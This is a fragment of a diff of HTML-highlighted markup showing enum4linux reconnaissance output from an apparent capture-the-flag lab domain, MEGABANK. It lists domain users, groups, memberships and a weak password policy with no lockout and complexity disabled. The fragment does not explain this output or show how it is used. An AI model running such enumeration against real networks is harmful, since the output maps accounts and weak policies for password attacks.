+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Protected Users] rid:[0x20d]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[DnsUpdateProxy] rid:[0x44e]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Azure Admins] rid:[0xa29]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[File Server Admins] rid:[0xa2e]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Call Recording Admins] rid:[0xa2f]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Reception] rid:[0xa30]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Operations] rid:[0xa31]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Trading] rid:[0xa32]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[HelpDesk] rid:[0xa33]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Developers] rid:[0xa34]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Getting domain group memberships:
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;HelpDesk&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 2611) has member: MEGABANK\roleary
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Trading&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 2610) has member: MEGABANK\dgalanos
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Operations&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 2609) has member: MEGABANK\smorgan
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Azure Admins&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 2601) has member: MEGABANK\Administrator
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Azure Admins&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 2601) has member: MEGABANK\AAD_987d7f2f57d2
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Azure Admins&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 2601) has member: MEGABANK\mhope
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Domain Guests&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 514) has member: MEGABANK\Guest
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Domain Users&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 513) has member: MEGABANK\Administrator
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Domain Users&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 513) has member: MEGABANK\krbtgt
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Domain Users&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 513) has member: MEGABANK\AAD_987d7f2f57d2
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Domain Users&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 513) has member: MEGABANK\mhope
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Domain Users&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 513) has member: MEGABANK\SABatchJobs
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Domain Users&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 513) has member: MEGABANK\svc-ata
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Domain Users&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 513) has member: MEGABANK\svc-bexec
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Domain Users&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 513) has member: MEGABANK\svc-netapp
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Domain Users&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 513) has member: MEGABANK\dgalanos
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Domain Users&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 513) has member: MEGABANK\roleary
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Domain Users&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 513) has member: MEGABANK\smorgan
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Group Policy Creator Owners&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 520&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator
 
-user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Guest&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x1f5&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;AAD_987d7f2f57d2&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x450&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;mhope&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x641&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SABatchJobs&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0xa2a&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;svc-ata&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0xa2b&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;svc-bexec&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0xa2c&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;svc-netapp&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0xa2d&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;dgalanos&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0xa35&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;roleary&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0xa36&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;smorgan&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0xa37&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-
- &lt;span class=&#34;o&#34;&gt;=========================================&lt;/span&gt; 
-&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Share Enumeration on 10.10.10.172    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
- &lt;span class=&#34;o&#34;&gt;=========================================&lt;/span&gt; 
-
-	Sharename       Type      Comment
-	---------       ----      -------
-SMB1 disabled -- no workgroup available
-
-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Attempting to map shares on 10.10.10.172
-
- &lt;span class=&#34;o&#34;&gt;====================================================&lt;/span&gt; 
-&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Password Policy Information &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.172    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
- &lt;span class=&#34;o&#34;&gt;====================================================&lt;/span&gt; 
-
-
-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Attaching to 10.10.10.172 using a NULL share
-
-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Trying protocol 445/SMB...
-
-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Found domain&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
-
-	&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; MEGABANK
-	&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Builtin
-
-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Password Info &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; Domain: MEGABANK
-
-	&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Minimum password length: &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;
-	&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Password &lt;span class=&#34;nb&#34;&gt;history&lt;/span&gt; length: &lt;span class=&#34;m&#34;&gt;24&lt;/span&gt;
-	&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Maximum password age: &lt;span class=&#34;m&#34;&gt;41&lt;/span&gt; days &lt;span class=&#34;m&#34;&gt;23&lt;/span&gt; hours &lt;span class=&#34;m&#34;&gt;53&lt;/span&gt; minutes 
-	&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Password Complexity Flags: &lt;span class=&#34;m&#34;&gt;000000&lt;/span&gt;
-
-		&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Domain Refuse Password Change: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
-		&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Domain Password Store Cleartext: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
-		&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Domain Password Lockout Admins: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
-		&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Domain Password No Clear Change: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
-		&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Domain Password No Anon Change: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
-		&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Domain Password Complex: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
-
-	&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Minimum password age: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; day &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; minutes 
-	&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Reset Account Lockout Counter: &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt; minutes 
-	&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Locked Account Duration: &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt; minutes 
-	&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Account Lockout Threshold: None
-	&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Forced Log off Time: Not Set
-
-
-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Retieved partial password policy with rpcclient:
-
-Password Complexity: Disabled
-Minimum Password Length: &lt;span class=&#34;nv&#34;&gt;7&lt;/span&gt;
-
-
- &lt;span class=&#34;o&#34;&gt;==============================&lt;/span&gt; 
-&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Groups on 10.10.10.172    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
- &lt;span class=&#34;o&#34;&gt;==============================&lt;/span&gt; 
-
-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Getting &lt;span class=&#34;nb&#34;&gt;builtin&lt;/span&gt; groups:
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Pre-Windows &lt;span class=&#34;m&#34;&gt;2000&lt;/span&gt; Compatible Access&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x22a&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Incoming Forest Trust Builders&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x22d&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Windows Authorization Access Group&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x230&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Terminal Server License Servers&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x231&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Users&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x221&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Guests&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x222&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Remote Desktop Users&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x22b&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Network Configuration Operators&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x22c&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Performance Monitor Users&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x22e&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Performance Log Users&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x22f&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Distributed COM Users&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x232&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;IIS_IUSRS&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x238&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Cryptographic Operators&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x239&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Event Log Readers&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x23d&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Certificate Service DCOM Access&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x23e&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;RDS Remote Access Servers&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x23f&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;RDS Endpoint Servers&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x240&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;RDS Management Servers&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x241&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Hyper-V Administrators&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x242&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Access Control Assistance Operators&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x243&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Remote Management Users&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x244&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Storage Replica Administrators&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x246&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-
-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Getting &lt;span class=&#34;nb&#34;&gt;builtin&lt;/span&gt; group memberships:
-Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;IIS_IUSRS&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 568&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: Couldn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t lookup SIDs
-&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Guests&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 546) has member: Couldn&amp;#39;&lt;/span&gt;t lookup SIDs
-Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Incoming Forest Trust Builders&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 557&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE
-Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Pre-Windows 2000 Compatible Access&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 554&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: Couldn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t lookup SIDs
-&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Windows Authorization Access Group&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 560) has member: Couldn&amp;#39;&lt;/span&gt;t lookup SIDs
-Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Remote Management Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 580&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: Couldn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t lookup SIDs
-&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Users&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 545) has member: Couldn&amp;#39;&lt;/span&gt;t lookup SIDs
-
-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Getting &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; groups:
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Cert Publishers&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x205&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;RAS and IAS Servers&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x229&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Allowed RODC Password Replication Group&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x23b&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Denied RODC Password Replication Group&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x23c&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;DnsAdmins&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x44d&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SQLServer2005SQLBrowserUser&lt;span class=&#34;nv&#34;&gt;$MONTEVERDE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x44f&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ADSyncAdmins&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x451&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ADSyncOperators&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x452&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ADSyncBrowse&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x453&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ADSyncPasswordSet&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x454&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-
-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Getting &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; group memberships:
-Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;ADSyncAdmins&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 1105&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: Couldn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t lookup SIDs
-&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Denied RODC Password Replication Group&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 572) has member: Couldn&amp;#39;&lt;/span&gt;t lookup SIDs
-
-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Getting domain groups:
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Enterprise Read-only Domain Controllers&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x1f2&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Domain Users&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x201&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Domain Guests&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x202&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Domain Computers&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x203&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Group Policy Creator Owners&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x208&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Cloneable Domain Controllers&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x20a&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Protected Users&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x20d&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;DnsUpdateProxy&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x44e&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
